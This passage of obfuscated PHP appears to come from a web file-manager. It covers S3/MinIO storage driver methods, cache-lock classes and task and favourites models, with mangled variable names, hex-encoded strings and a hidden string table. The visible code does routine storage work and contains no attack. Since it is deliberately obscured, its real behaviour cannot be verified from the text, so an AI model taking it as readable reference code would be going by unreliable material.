$this->listObjs($µ³òËÕ³, null, null, $„ÁÒÒ); if (!$Ç¾§£ã) { return array($¾íŠ‚ñ¹[82] => array(), $¾íŠ‚ñ¹[83] => array()); } $ùåˆí²½ = $¸áš°ôş = array(); foreach ($Ç¾§£ã[$¾íŠ‚ñ¹[204]] as $åğÀÀÈ–) { $•¶ÉĞ¹™ = $åğÀÀÈ–[$¾íŠ‚ñ¹[32]]; if ($•¶ÉĞ¹™ == $µ³òËÕ³) { continue; } $·‰ÛÒóÏ = isset($åğÀÀÈ–[$¾íŠ‚ñ¹[76]]) ? $åğÀÀÈ–[$¾íŠ‚ñ¹[76]] : 0; $áíÍ¼Ü = $·‰ÛÒóÏ == 0 && substr($•¶ÉĞ¹™, strlen($•¶ÉĞ¹™) - 1, 1) == $¾íŠ‚ñ¹[8] ? !0 : !1; $this->cacheMethodInfoSet($•¶ÉĞ¹™, $áíÍ¼Ü, $åğÀÀÈ–); if ($áíÍ¼Ü) { $ùåˆí²½[] = $•¶ÉĞ¹™; continue; } $¸áš°ôş[] = $èúÚÏ–ˆ ? $åğÀÀÈ– : $•¶ÉĞ¹™; } foreach ($Ç¾§£ã[$¾íŠ‚ñ¹[205]] as $åğÀÀÈ–) { $ùåˆí²½[] = $åğÀÀÈ–[$¾íŠ‚ñ¹[32]]; $this->cacheMethodInfoSet($åğÀÀÈ–[$¾íŠ‚ñ¹[32]], !0); } $this->cacheMethodInfoSet($¶—ÄÖ„Æ, !0); return array($¾íŠ‚ñ¹[82] => $ùåˆí²½, $¾íŠ‚ñ¹[83] => $¸áš°ôş); } private function listObjs($äé°ÂŠ, $ŸÜùÌ’„ = null, $Ì×Ÿ¤Í¿ = null, $—µÒÒ‡¨ = null) { $ÜÁÚãå¨ =& $_SERVER[Ì¥ŞÒ°£]; $äé°ÂŠ = trim($äé°ÂŠ, $ÜÁÚãå¨[8]); $Ë¼ø…² = empty($äé°ÂŠ) && $äé°ÂŠ !== $ÜÁÚãå¨[197] ? $ÜÁÚãå¨[12] : $äé°ÂŠ . $ÜÁÚãå¨[8]; return $this->client->getBucket($this->bucket, $Ë¼ø…², $ŸÜùÌ’„, $Ì×Ÿ¤Í¿, $—µÒÒ‡¨, !0); } public function has($ºğŞíË¨, $ÑÆÅÍæ = false, $ê•úÅÑ¬ = true) { $¨Ìè‡¬° =& $_SERVER[Ì¥ŞÒ°£]; $ºğŞíË¨ = trim($ºğŞíË¨, $¨Ìè‡¬°[8]); $Ú¼–‰× = empty($ºğŞíË¨) && $ºğŞíË¨ !== $¨Ìè‡¬°[197] ? $¨Ìè‡¬°[12] : $ºğŞíË¨ . $¨Ìè‡¬°[8]; $ŞÙş™ç€ = null; $Â•ñÍ¶ = 500; $Ø–›ÈæÇ = $¨Ìè‡¬°[8]; $Úà¬åäö = $œë¡Î· = array(); while (!0) { $–ğÖ = $this->listObjs($ºğŞíË¨, $ŞÙş™ç€, $Â•ñÍ¶, $Ø–›ÈæÇ); if (!$–ğÖ) { break; } $ŞÙş™ç€ = $–ğÖ[$¨Ìè‡¬°[206]]; $‰íÁ¢È‘ = $–ğÖ[$¨Ìè‡¬°[204]]; $Ÿ©üŸü® = $–ğÖ[$¨Ìè‡¬°[205]]; if (empty($‰íÁ¢È‘) && empty($Ÿ©üŸü®)) { break; } if (count($‰íÁ¢È‘) == 1 && $‰íÁ¢È‘[0][$¨Ìè‡¬°[32]] == $Ú¼–‰×) { break; } if ($ÑÆÅÍæ) { if (count($‰íÁ¢È‘)) { $‰íÁ¢È‘ = array_column($‰íÁ¢È‘, $¨Ìè‡¬°[32]); $Úà¬åäö = array_merge($Úà¬åäö, $‰íÁ¢È‘); } if (count($Ÿ©üŸü®)) { $Ÿ©üŸü® = array_column($Ÿ©üŸü®, $¨Ìè‡¬°[32]); $œë¡Î· = array_merge($œë¡Î·, $Ÿ©üŸü®); } if ($ŞÙş™ç€ === null) { break; } continue; } if ($ê•úÅÑ¬) { if (!empty($‰íÁ¢È‘)) { if (count($‰íÁ¢È‘) > 1 || isset($‰íÁ¢È‘[0][$¨Ìè‡¬°[32]]) && $‰íÁ¢È‘[0][$¨Ìè‡¬°[32]] != $Ú¼–‰×) { return !0; } } } else { if (!empty($Ÿ©üŸü®)) { return !0; } } if ($ŞÙş™ç€ === null) { break; } } if ($ÑÆÅÍæ) { $Úà¬åäö = array_diff($Úà¬åäö, array($Ú¼–‰×)); $Úà¬åäö = count(array_unique($Úà¬åäö)); $œë¡Î· = count(array_unique($œë¡Î·)); return array($¨Ìè‡¬°[207] => $Úà¬åäö, $¨Ìè‡¬°[208] => $œë¡Î·); } return !1; } public function listAll($åØ¸ ÷) { $È–ğÃÒ¦ =& $_SERVER[Ì¥ŞÒ°£]; $ÆÖ×¢‚ = $this->fileList($åØ¸ ÷, $È–ğÃÒ¦[12], !0); $šõ…¢†û = array(); foreach ($ÆÖ×¢‚[$È–ğÃÒ¦[83]] as $¤×¤¼º) { $šõ…¢†û[$¤×¤¼º[$È–ğÃÒ¦[32]]] = $¤×¤¼º[$È–ğÃÒ¦[76]]; } foreach ($ÆÖ×¢‚[$È–ğÃÒ¦[82]] as $¤×¤¼º) { if (is_string($¤×¤¼º)) { $šõ…¢†û[$¤×¤¼º] = 0; } } return $this->listAllFiles($åØ¸ ÷, array_keys($šõ…¢†û), $šõ…¢†û); } public function canRead($Á£´ò·º) { $Ä§Øã‡ =& $_SERVER[Ì¥ŞÒ°£]; $¡ÑíáÂÕ = $this->client->getAccessControlPolicy($this->bucket, $Á£´ò·º); if (!$¡ÑíáÂÕ) { return !1; } return in_array($¡ÑíáÂÕ, array($Ä§Øã‡[209], $Ä§Øã‡[210], $Ä§Øã‡[211])) ? !0 : !1; } public function canWrite($Ï¢–ÃÎğ) { $üúã¨å =& $_SERVER[Ì¥ŞÒ°£]; $–¶‰îª = $this->client->getAccessControlPolicy($this->bucket, $Ï¢–ÃÎğ); if (!$–¶‰îª) { return !1; } return in_array($–¶‰îª, array($üúã¨å[209], $üúã¨å[210])) ? !0 : !1; } public function getContent($ÅÕÂ¬øé) { return $this->client->getObject($this->bucket, $ÅÕÂ¬øé); } public function setContent($·ú™Í¶•, $—®Ê Ú¸ = '', $èÙõ†îú = false) { $ó‘…µ» =& $_SERVER[Ì¥ŞÒ°£]; $·ú™Í¶• = $èÙõ†îú ? trim($·ú™Í¶•, $ó‘…µ»[8]) . $ó‘…µ»[8] : $·ú™Í¶•; $üğØ­…² = get_file_mime(get_path_ext($·ú™Í¶•)); $÷¨‘Ğ“Ü = $this->client->putObject($—®Ê Ú¸, $this->bucket, $·ú™Í¶•, $ó‘…µ»[198], array(), $üğØ­…²); if (!$÷¨‘Ğ“Ü) { return !1; } if ($èÙõ†îú) { return !0; } $this->cacheMethod(null, null); $÷¨‘Ğ“Ü = $this->copyFile($·ú™Í¶•, $·ú™Í¶•, array($ó‘…µ»[212] => $÷¨‘Ğ“Ü[$ó‘…µ»[213]])); return $÷¨‘Ğ“Ü ? !0 : !1; } public function fileSubstr($Êì âŞ¹, $ ³§á±Ê, $ÏÊª›ñ©) { $ áŒ™ = $ ³§á±Ê + $ÏÊª›ñ© - 1; return $this->client->getObject($this->bucket, $Êì âŞ¹, array($_SERVER[Ì¥ŞÒ°£][214] => "\x62\x79\164\145\x73\x3d{$ ³§á±Ê}\55{$ áŒ™}")); } public function upload($°©ˆ‘Ö, $Ä¤’¡¼, $ù†îŞ„è = false, $Ëú¼ ìÍ = REPEAT_REPLACE) { $Ò§Èü‡ =& $_SERVER[Ì¥ŞÒ°£]; $²©¦…Ãë = array($Ò§Èü‡[212] => @md5_file($Ä¤’¡¼)); $­í€¼¶ = array($Ò§Èü‡[215] => get_file_mime(get_path_ext($°©ˆ‘Ö))); if (IO::size($Ä¤’¡¼) <= 1024 * 1024 * 200) { $ÇÖŞ£ş¨ = $this->client->putObjectFile($Ä¤’¡¼, $this->bucket, $°©ˆ‘Ö, $Ò§Èü‡[198], $²©¦…Ãë, $­í€¼¶); return !empty($ÇÖŞ£ş¨) ? $this->getPathOuter($°©ˆ‘Ö) : !1; } $Ÿåº© = $this->client->multiUploadObject($Ä¤’¡¼, $this->bucket, trim($°©ˆ‘Ö, $Ò§Èü‡[8]), $²©¦…Ãë, $­í€¼¶); return $Ÿåº© ? $this->getPathOuter($°©ˆ‘Ö) : !1; } public function download($‡ª¥Á¨, $æä©éÁÁ) { if (!@is_dir($this->pathFather($æä©éÁÁ)) && !IO::mkdir($this->pathFather($æä©éÁÁ))) { return !1; } $¸ù¥™æ½ = $this->client->getObject($this->bucket, $‡ª¥Á¨, array(), $æä©éÁÁ); return $¸ù¥™æ½ !== !1 ? $æä©éÁÁ : !1; } public function link($çÊÏó­, $Ëî°åáÂ = array()) { $ğŞ¦˜¾ç =& $_SERVER[Ì¥ŞÒ°£]; if ($this->signVer == $ğŞ¦˜¾ç[216]) { return $this->client->getAuthenticatedURL($this->bucket, $çÊÏó­, 3600 * 12, $Ëî°åáÂ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($çÊÏó­, $ğŞ¦˜¾ç[8]), 3600 * 12, $this->region, array(), !0, $Ëî°åáÂ); } public function fileOut($‹Éñ§ñß, $û·ƒÂŞé = false, $š°Å¸ñå = false, $Ø££Ûù = '') { $‹œ«ù×ˆ =& $_SERVER[Ì¥ŞÒ°£]; if ($this->isFileOutServer()) { return $this->fileOutServer($‹Éñ§ñß, $û·ƒÂŞé, $š°Å¸ñå, $Ø££Ûù); } if (!$š°Å¸ñå) { $š°Å¸ñå = $this->pathThis($‹Éñ§ñß); } $­Ò©úˆØ = get_file_mime(get_path_ext($š°Å¸ñå)); if ($­Ò©úˆØ == $‹œ«ù×ˆ[217]) { return parent::fileOut($‹Éñ§ñß, $û·ƒÂŞé, $š°Å¸ñå, $Ø££Ûù); } $ÜåĞÅ‹Ş = array($‹œ«ù×ˆ[218] => $­Ò©úˆØ); if ($û·ƒÂŞé) { $ÜåĞÅ‹Ş[$‹œ«ù×ˆ[219]] = $‹œ«ù×ˆ[220] . rawurlencode($š°Å¸ñå); } else { } $ßıİó“ = $this->link($‹Éñ§ñß, $ÜåĞÅ‹Ş); $this->fileOutLink($ßıİó“); } public function fileOutServer($Õ±–õ¢¥, $€²¹Á©æ = false, $ä½˜ã‰ˆ = false, $ÈŸšĞ½ü = '') { parent::fileOut($Õ±–õ¢¥, $€²¹Á©æ, $ä½˜ã‰ˆ, $ÈŸšĞ½ü); } public function fileOutImageServer($š¥Ä£, $×²µ‹ = 250) { parent::fileOutImage($š¥Ä£, $×²µ‹); } public function hashMd5($È·´ñÊş, $Ìæ“Û‚ = '') { $«òõç¼ç =& $_SERVER[Ì¥ŞÒ°£]; $ü—©èö = $this->objectMeta($È·´ñÊş); if (!$ü—©èö) { return !1; } $Ìæ“Û‚ = $Ìæ“Û‚ ? $Ìæ“Û‚ : _get($ü—©èö, $«òõç¼ç[221]); $Ìæ“Û‚ = $Ìæ“Û‚ ? $Ìæ“Û‚ : _get($ü—©èö, $«òõç¼ç[213], $«òõç¼ç[12]); return $Ìæ“Û‚; } public function uploadFormData($ûÜê¬, $¼Óƒ –Ü = 3600) { $¡àĞ—Õ =& $_SERVER[Ì¥ŞÒ°£]; $åæû­íÍ = $this->pathFather($ûÜê¬); $ÏÏüÕÇ§ = $this->client->getHttpUploadPostParams($this->bucket, $åæû­íÍ, $¡àĞ—Õ[198], $¼Óƒ –Ü); return array_merge((array) $ÏÏüÕÇ§, array($¡àĞ—Õ[181] => $this->getHost())); } public function multiUploadFormData($¿ëËõ´×, $¢ˆ™– = 3600) { $èöĞâ›· =& $_SERVER[Ì¥ŞÒ°£]; $á‚âŠÅ¼ = gmdate($èöĞâ›·[222]); $¬”ÉïçÛ = array(); $‡ñş‰–€ = $this->client->getUploadId($this->bucket, $¿ëËõ´×, $¬”ÉïçÛ); if (!$‡ñş‰–€) { return !1; } return array($èöĞâ›·[223] => $‡ñş‰–€, $èöĞâ›·[181] => $this->getHost() . $èöĞâ›·[8] . $this->pathEncode($¿ëËõ´×), $èöĞâ›·[224] => $á‚âŠÅ¼, $èöĞâ›·[94] => $¿ëËõ´×); } public function multiUploadAuthData($€‚·úğ, $šøÃÍ•å = array()) { $…È´ï‰Í =& $_SERVER[Ì¥ŞÒ°£]; $û­—æ…› = isset($šøÃÍ•å[$…È´ï‰Í[224]]) ? $šøÃÍ•å[$…È´ï‰Í[224]] : gmdate($…È´ï‰Í[222]); $şŞ°ş› = isset($šøÃÍ•å[$…È´ï‰Í[174]]) ? $šøÃÍ•å[$…È´ï‰Í[174]] : $…È´ï‰Í[12]; $Ì øÛèø = $šøÃÍ•å[$…È´ï‰Í[94]]; unset($šøÃÍ•å[$…È´ï‰Í[94]]); if (isset($šøÃÍ•å[$…È´ï‰Í[225]])) { $šøÃÍ•å[$…È´ï‰Í[224]] = $û­—æ…›; return $this->listUploadParts($Ì øÛèø, $šøÃÍ•å); } $íªÆÑ¹ì = array($…È´ï‰Í[226], $…È´ï‰Í[12], $…È´ï‰Í[120], $…È´ï‰Í[12], "\x78\x2d\141\x6d\172\55\x64\141\x74\145\x3a{$û­—æ…›}", $…È´ï‰Í[8] . $this->bucket . $…È´ï‰Í[8] . $this->pathEncode($Ì øÛèø) . $şŞ°ş›); if (strpos($şŞ°ş›, $…È´ï‰Í[227]) === 0) { $íªÆÑ¹ì[0] = $…È´ï‰Í[228]; } if (isset($šøÃÍ•å[$…È´ï‰Í[229]]) && $šøÃÍ•å[$…È´ï‰Í[229]] == $…È´ï‰Í[230]) { $íªÆÑ¹ì[0] = $…È´ï‰Í[230]; } $¤ÚèÔÔ = implode($…È´ï‰Í[231], $íªÆÑ¹ì); $çíàå™· = base64_encode(hash_hmac($…È´ï‰Í[232], $¤ÚèÔÔ, $this->secret, !0)); $û®¹¢Ş® = $…È´ï‰Í[233] . $this->accessKey . $…È´ï‰Í[4] . $çíàå™·; if (strpos($şŞ°ş›, $…È´ï‰Í[227]) === 0) { return array($…È´ï‰Í[234] => $û®¹¢Ş®, $…È´ï‰Í[224] => $û­—æ…›); } return $û®¹¢Ş®; } public function listUploadParts($‹ì®¹û‡, $šÒØúå¤ = array()) { $Ì»º¤ó„ =& $_SERVER[Ì¥ŞÒ°£]; $Òå—¦—£ = str_replace($Ì»º¤ó„[235], $Ì»º¤ó„[12], $šÒØúå¤[$Ì»º¤ó„[174]]); $“Ñâ¢‚Ö = $this->client->listParts($this->bucket, $‹ì®¹û‡, $Òå—¦—£); if (!$“Ñâ¢‚Ö) { return !1; } unset($šÒØúå¤[$Ì»º¤ó„[225]], $šÒØúå¤[$Ì»º¤ó„[229]]); $šÒØúå¤[$Ì»º¤ó„[94]] = $‹ì®¹û‡; $ÍÄ¸¹è = $this->multiUploadAuthData($‹ì®¹û‡, $šÒØúå¤); if (empty($ÍÄ¸¹è)) { return !1; } return array($Ì»º¤ó„[234] => $ÍÄ¸¹è, $Ì»º¤ó„[224] => $šÒØúå¤[$Ì»º¤ó„[224]], $Ì»º¤ó„[236] => $“Ñâ¢‚Ö); } public function getHost() { return parent::getHost() . $_SERVER[Ì¥ŞÒ°£][8] . $this->bucket; } public function size($† ø•ïÚ) { $´ªÀÉÍç = $this->objectMeta($† ø•ïÚ); return $´ªÀÉÍç ? $´ªÀÉÍç[$_SERVER[Ì¥ŞÒ°£][76]] : 0; } public function info($¼è¦ËÇê) { if ($this->isFolder($¼è¦ËÇê)) { return $this->folderInfo($¼è¦ËÇê); } else { if ($this->isFile($¼è¦ËÇê)) { return $this->fileInfo($¼è¦ËÇê); } } return !1; } public function exist($Â¡±†ıè) { return $this->isFile($Â¡±†ıè) || $this->isFolder($Â¡±†ıè); } public function isFile($Èû¸Œª’) { return !$this->isFolder($Èû¸Œª’) && $this->objectMeta($Èû¸Œª’); } public function isFolder($äšäÙ›É) { return $this->cacheMethod($_SERVER[Ì¥ŞÒ°£][165], $äšäÙ›É); } protected function objectMeta($™´Ôß­Œ) { return $this->cacheMethod($_SERVER[Ì¥ŞÒ°£][167], $™´Ôß­Œ); } protected function _objectMeta($İƒõõüŞ) { $œÇŞüõŒ =& $_SERVER[Ì¥ŞÒ°£]; $İƒõõüŞ = rtrim($İƒõõüŞ, $œÇŞüõŒ[8]); try { $¯Æç¯ñ = $this->client->getObjectInfo($this->bucket, $İƒõõüŞ); if (!isset($¯Æç¯ñ[$œÇŞüõŒ[221]]) && isset($¯Æç¯ñ[$œÇŞüõŒ[237]])) { $¯Æç¯ñ[$œÇŞüõŒ[221]] = $¯Æç¯ñ[$œÇŞüõŒ[237]]; } } catch (Exception $ˆ²éîø‰) { $¯Æç¯ñ = !1; } if (!$¯Æç¯ñ) { } return $¯Æç¯ñ; } protected function _isFolder($’¡ıÌÔÏ) { $­ ı÷ë =& $_SERVER[Ì¥ŞÒ°£]; $’¡ıÌÔÏ = rtrim($’¡ıÌÔÏ, $­ ı÷ë[8]); if ($’¡ıÌÔÏ == $­ ı÷ë[12] || $’¡ıÌÔÏ == $­ ı÷ë[8]) { return !0; } $´Òîíïó = $this->client->getBucket($this->bucket, $’¡ıÌÔÏ, null, 1); if (empty($´Òîíïó[$­ ı÷ë[204]])) { return !1; } $å¨ĞŒ¸Ã = $´Òîíïó[$­ ı÷ë[204]][0][$­ ı÷ë[32]]; return stripos($å¨ĞŒ¸Ã, $’¡ıÌÔÏ . $­ ı÷ë[8]) === 0 ? !0 : !1; if (substr($å¨ĞŒ¸Ã, -1) == $­ ı÷ë[8]) { return !0; } if (get_path_this($å¨ĞŒ¸Ã) == get_path_this($’¡ıÌÔÏ)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($¸œ¢ú ) { parent::__construct($¸œ¢ú ); $this->signatureVersion($_SERVER[Ì¥ŞÒ°£][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto D†Ó®¦Îë‹; B±ÉÍÉÒ¢“: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $î‹íÓ›¯ =& $_SERVER[Ì¥ŞÒ°£]; $û´Ñ÷—… = $GLOBALS[$î‹íÓ›¯[6]][$î‹íÓ›¯[349]]; self::$cachePath = $û´Ñ÷—…[$î‹íÓ›¯[199]][$î‹íÓ›¯[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($½šëÊòÔ, $é¸ı¬¶ñ = 0) { $‘íÅĞ¼ò =& $_SERVER[Ì¥ŞÒ°£]; $–‡Û´êë = microtime(!0); $º‰´†›¹ = $–‡Û´êë + $é¸ı¬¶ñ + 0.0001; $ÃØÀôÂÙ = rtrim(self::$cachePath, $‘íÅĞ¼ò[8]) . $‘íÅĞ¼ò[861] . md5($½šëÊòÔ) . $‘íÅĞ¼ò[858]; if (file_exists($ÃØÀôÂÙ) && filemtime($ÃØÀôÂÙ) && filemtime($ÃØÀôÂÙ) < time() - 10) { @unlink($ÃØÀôÂÙ); } do { if (file_exists($ÃØÀôÂÙ)) { cacheLockWait(); continue; } $ëˆ½ü÷† = fopen($ÃØÀôÂÙ, $‘íÅĞ¼ò[862]); if (!$ëˆ½ü÷†) { return !1; } $Ğ‡ŒÉ© = flock($ëˆ½ü÷†, LOCK_EX | LOCK_NB); self::$caches[$½šëÊòÔ] = array($‘íÅĞ¼ò[863] => $ëˆ½ü÷†, $‘íÅĞ¼ò[199] => $ÃØÀôÂÙ); fwrite($ëˆ½ü÷†, $º‰´†›¹); clearstatcache(); if ($ëˆ½ü÷† && $Ğ‡ŒÉ©) { return !0; } cacheLockWait(); } while (microtime(!0) < $º‰´†›¹); $this->unlock($½šëÊòÔ); return !1; } public function lockGet($‡ÄßèÙ‡) { $Åó×ÎÁ =& $_SERVER[Ì¥ŞÒ°£]; $Ú½ìĞ‹® = rtrim(self::$cachePath, $Åó×ÎÁ[8]) . $Åó×ÎÁ[861] . md5($‡ÄßèÙ‡) . $Åó×ÎÁ[858]; return file_exists($Ú½ìĞ‹®); } public function unlock($Ğ¾öâ¼â) { $áıò÷“ö =& $_SERVER[Ì¥ŞÒ°£]; $¾¾©ÌŠ· = self::$caches[$Ğ¾öâ¼â]; if (!$¾¾©ÌŠ·) { return; } @flock($¾¾©ÌŠ·[$áıò÷“ö[863]], LOCK_UN); @fclose($¾¾©ÌŠ·[$áıò÷“ö[863]]); @unlink($¾¾©ÌŠ·[$áıò÷“ö[199]]); unset(self::$caches[$Ğ¾öâ¼â]); } } class CacheLockRedis { public function lock($‰’¾±»², $¹öì–Ë¾ = 10) { $öØŞ‰–· = Cache::init(); $ØÚ«­–ğ = microtime(!0) + $¹öì–Ë¾; while (microtime(!0) < $ØÚ«­–ğ) { $ËÙ¨õ±û = $öØŞ‰–·->get($‰’¾±»²); if (!$ËÙ¨õ±û) { $ëè®ÙÈä = $öØŞ‰–·->setLock($‰’¾±»², $ØÚ«­–ğ, $¹öì–Ë¾); if ($ëè®ÙÈä) { return !0; } } else { if ($ËÙ¨õ±û < microtime(!0)) { $öØŞ‰–·->set($‰’¾±»², $ØÚ«­–ğ, $¹öì–Ë¾ * 2); if ($öØŞ‰–·->get($‰’¾±»²) === $ËÙ¨õ±û) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($˜ğÔöŞ¬) { return Cache::init()->get($˜ğÔöŞ¬); } public function unlock($óåı¦ã…) { return Cache::init()->remove($óåı¦ã…); } } class CacheLockMemcached { public function lock($Œ¼‰²–, $Ì•Ô´™Ô = 0) { $Ã¶ëà¨ª = Cache::init(); $¡¡¦ÔÆ = microtime(!0) + $Ì•Ô´™Ô; while (microtime(!0) < $¡¡¦ÔÆ) { $œ£øÀ¥ = $Ã¶ëà¨ª->get($Œ¼‰²–); if (!$œ£øÀ¥ || $œ£øÀ¥ < microtime(!0)) { $ŒÓû«± = $Ã¶ëà¨ª->handle->add($Œ¼‰²–, $¡¡¦ÔÆ, $Ì•Ô´™Ô); if ($ŒÓû«±) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ê½¸‰¨) { return Cache::init()->get($ê½¸‰¨); } public function unlock($œÅ…æÛ—) { return Cache::init()->remove($œÅ…æÛ—); } } goto EË¹†°¢ë; aÜ’˜Ù§”: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\56\164\141\x73\153\114\x69\163\164"; public $field = array("\x6e\x61\155\x65", "\x74\171\160\145", "\145\x76\145\156\x74", "\164\151\x6d\145", "\144\x65\163\x63", "\163\x79\x73\164\145\x6d", "\x65\x6e\x61\142\x6c\145", "\x6c\x61\x73\164\122\x75\156", "\x73\157\x72\x74"); public function listData($Ø™©õ˜ü = false, $¢¦³•³ = "\163\x6f\162\164", $ŸÇ»çÈØ = false) { return parent::listData($Ø™©õ˜ü, $¢¦³•³, $ŸÇ»çÈØ); } public function add($ª¼ Ùšƒ) { $øÒä‰«¬ =& $_SERVER[Ì¥ŞÒ°£]; $×áüÓøç = $this->findByName($ª¼ Ùšƒ[$øÒä‰«¬[32]]); if ($×áüÓøç) { return !1; } $ª¼ Ùšƒ[$øÒä‰«¬[1627]] = 0; $ª¼ Ùšƒ[$øÒä‰«¬[1881]] = $this->getSort(); return parent::insert($ª¼ Ùšƒ); } private function getSort() { $…œ¨èŸ§ =& $_SERVER[Ì¥ŞÒ°£]; $Õ´…˜Üö = parent::listData(); $ñ“±ïœ» = array_to_keyvalue($Õ´…˜Üö, $…œ¨èŸ§[12], $…œ¨èŸ§[1881]); return empty($ñ“±ïœ») ? 0 : max($ñ“±ïœ») + 1; } public function update($èºÂîî, $’Ä½ÂÃ³) { $Ù“ÁâÀı =& $_SERVER[Ì¥ŞÒ°£]; $ŞĞˆŠ™Œ = $this->listData($èºÂîî); $•á÷×ğ¶ = $this->findByName($’Ä½ÂÃ³[$Ù“ÁâÀı[32]]); if (!$ŞĞˆŠ™Œ || $•á÷×ğ¶ && $•á÷×ğ¶[$Ù“ÁâÀı[399]] != $ŞĞˆŠ™Œ[$Ù“ÁâÀı[399]]) { return !1; } return parent::update($èºÂîî, $’Ä½ÂÃ³); } public function remove($ÜçÅÏóó, $ó¹›¶º° = false) { $ÚÛ¯ÕÏ‚ =& $_SERVER[Ì¥ŞÒ°£]; $­—Ş•ß­ = $this->listData($ÜçÅÏóó); if (!$­—Ş•ß­) { return; } if (!$ó¹›¶º° && $­—Ş•ß­[$ÚÛ¯ÕÏ‚[1290]] == $ÚÛ¯ÕÏ‚[88]) { return !1; } return parent::remove($ÜçÅÏóó); } public function enable($ş“¢Ã», $÷ÑÂÃ¿ß) { return $this->update($ş“¢Ã», array($_SERVER[Ì¥ŞÒ°£][2284] => $÷ÑÂÃ¿ß)); } public function run($€™öÜ¢ß) { return $this->update($€™öÜ¢ß, array($_SERVER[Ì¥ŞÒ°£][2296] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\x5f\146\x61\x76"; protected function cacheFunctionAlias($ãŸŠĞÔ) { $ŠèÖÜ™ =& $_SERVER[Ì¥ŞÒ°£]; return array($ŠèÖÜ™[1968] => array(USER_ID, $ŠèÖÜ™[2297])); } protected function listData() { $ãî§‘³¸ =& $_SERVER[Ì¥ŞÒ°£]; $„Â»ñÏÃ = array($ãî§‘³¸[1658] => USER_ID, $ãî§‘³¸[484] => 0); $ÍÕµ—­æ = $ãî§‘³¸[2298]; $Ø†œÏÍ’ = $this->field($ÍÕµ—­æ)->where($„Â»ñÏÃ)->order($ãî§‘³¸[2299])->select(); return $Ø†œÏÍ’ ? $Ø†œÏÍ’ : array(); } protected function resetCache() { } protected function listView() { $ÀêûˆÓñ =& $_SERVER[Ì¥ŞÒ°£]; $Ê»ü’öË = $this->listData(); $  ûĞ’‹ = array_filter_by_field($Ê»ü’öË, $ÀêûˆÓñ[33], $ÀêûˆÓñ[416]); $ÃŠÇ¶ÖÊ = array_to_keyvalue($  ûĞ’‹, $ÀêûˆÓñ[12], $ÀêûˆÓñ[84]); if (!$ÃŠÇ¶ÖÊ) { return $Ê»ü’öË; } $›ãâìË† = 2000; $µ³™ıº¡ = array($ÀêûˆÓñ[417] => array($ÀêûˆÓñ[418], $ÃŠÇ¶ÖÊ)); $†æ£á‹° = Model($ÀêûˆÓñ[827])->listSource($µ³™ıº¡, $›ãâìË†); $†æ£á‹° = array_merge($†æ£á‹°[$ÀêûˆÓñ[83]], $†æ£á‹°[$ÀêûˆÓñ[82]]); $†æ£á‹° = array_to_keyvalue($†æ£á‹°, $ÀêûˆÓñ[402]); foreach ($Ê»ü’öË as $³Ã×ôŸ => $›ìÚ³«ğ) { $ÏÆù½ğ¦ = $†æ£á‹°[$›ìÚ³«ğ[$ÀêûˆÓñ[84]]]; $ÏÆù½ğ¦ = $ÏÆù½ğ¦ ? $ÏÆù½ğ¦ : array(); $Ê»ü’öË[$³Ã×ôŸ] = array_merge($ÏÆù½ğ¦, $›ìÚ³«ğ); } return $Ê»ü’öË; } protected function addFav($¥òî’ö®, $ŠÀî‹À = '', $“àæÚ¹Í = "\163\157\x75\162\143\145") { $†ŞÉÅ„ =& $_SERVER[Ì¥ŞÒ°£]; $ıÁ¶ŒÏ = array($†ŞÉÅ„[1658] => USER_ID, $†ŞÉÅ„[484] => 0, $†ŞÉÅ„[422] => $“àæÚ¹Í, $†ŞÉÅ„[421] => $¥òî’ö®); if ($this->where($ıÁ¶ŒÏ)->find()) { return !1; } $ıÁ¶ŒÏ = array($†ŞÉÅ„[1658] => USER_ID, $†ŞÉÅ„[484] => 0); $ÒÓÙÍä = $this->where($ıÁ¶ŒÏ)->max($†ŞÉÅ„[1881]); if (!$ÒÓÙÍä) { $ÒÓÙÍä = 0; } if (!$ŠÀî‹À && $“àæÚ¹Í == $†ŞÉÅ„[416]) { $»äÙ¯× = Model($†ŞÉÅ„[1341])->where(array($†ŞÉÅ„[417] => $¥òî’ö®))->find(); if (!$»äÙ¯×) { return !1; } $ŠÀî‹À = $»äÙ¯×[$†ŞÉÅ„[32]]; } $ŠÀî‹À = $this->getAutoName($ŠÀî‹À); $Ş÷–àß = array($†ŞÉÅ„[1658] => USER_ID, $†ŞÉÅ„[484] => 0, $†ŞÉÅ„[420] => $ŠÀî‹À, $†ŞÉÅ„[421] => $¥òî’ö®, $†ŞÉÅ„[422] => $“àæÚ¹Í, $†ŞÉÅ„[1861] => $ÒÓÙÍä + 1); return $this->add($Ş÷–àß); } protected function remove($•—åèê) { $Üë·Ôå =& $_SERVER[Ì¥ŞÒ°£]; $’ˆÈ”­² = array($Üë·Ôå[1658] => USER_ID, $Üë·Ôå[419] => $•—åèê); return $this->where($’ˆÈ”­²)->delete(); } protected function removeByName($Ûá˜²¾ƒ) { $Ú™Ëè´× =& $_SERVER[Ì¥ŞÒ°£]; $õ‹ı´ˆ = array($Ú™Ëè´×[1658] => USER_ID, $Ú™Ëè´×[420] => $Ûá˜²¾ƒ, $Ú™Ëè´×[484] => 0); return $this->where($õ‹ı´ˆ)->delete(); } protected function rename($éãâ™š, $çâ¿Àš±) { $•ƒ·£  =& $_SERVER[Ì¥ŞÒ°£]; if ($éãâ™š == $çâ¿Àš±) { return !1; } $Ù´Ïïª = $this->getAutoName($çâ¿Àš±); if ($çâ¿Àš± != $Ù´Ïïª) { return !1; } $²—»’¼Û = array($•ƒ·£ [1658] => USER_ID, $•ƒ·£ [484] => 0, $•ƒ·£ [32] => $éãâ™š); return $this->where($²—»’¼Û)->save(array($•ƒ·£ [32] => $çâ¿Àš±)); } protected function resetSort($äâßñ) { $„–áÛç€ =& $_SERVER[Ì¥ŞÒ°£]; $äâßñ = is_array($äâßñ) ? $äâßñ : array(); $ªÇæ¹ò¿ = array($„–áÛç€[1658] => USER_ID); for ($‡’Ğ÷í© = 0; 